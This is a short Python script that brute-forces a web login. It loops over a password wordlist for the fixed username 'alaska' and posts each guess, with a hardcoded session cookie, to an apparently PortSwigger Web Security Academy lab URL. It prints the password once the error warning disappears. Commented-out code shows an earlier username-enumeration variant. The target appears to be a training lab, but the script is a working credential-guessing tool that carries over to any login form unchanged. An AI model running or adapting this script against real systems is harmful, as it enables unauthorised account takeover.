#!/bin/python3

import os
import requests
import re

f = open("./passwords.txt",'r')
passwords = f.readlines()

f = open("./usernames.txt",'r')
usernames = f.readlines()





def cracking():
    print("<CRACKING LOGIN>")
    #print("<ENUMERATING USERS>")
    for username in usernames:
        username = username.strip("\n")
        username = "alaska"
        for password in passwords:
        #for i in range(0,5):
            password = password.strip("\n")
            #password = "FOOBAR"
            cookies = {
                'session': 'zYpmvNA5433FvtRfwpYOMjl5UBdkwVzI',
            }

            headers = {}

            data = {
                'username': username,
                'password': password
            }

            response = requests.post('https://0a14001f0431bb2fc0721cfd00cc0065.web-security-academy.net/login', cookies=cookies, headers=headers, data=data, verify=True, allow_redirects=False)

            text = response.text
            warning = re.search("warning>.*<",text)
            if warning is not None:
                print(warning.group())
            else:
                print(password)
                return

            #if response.status_code == 302:
#            if "Invalid username or password." not in response.text:
#                #print("\nCRACKED\n" + "Username is: " + username + "  Password is: " + password)
#                print("\nCRACKED\n" + "Username is: " + username)
#                return
#            else:
#                #print("Username: " + username + "  Password: " + password + "        ", end="\r")
            print("Username: " + username + "                 ", end="\r")


cracking()

#username: alaska
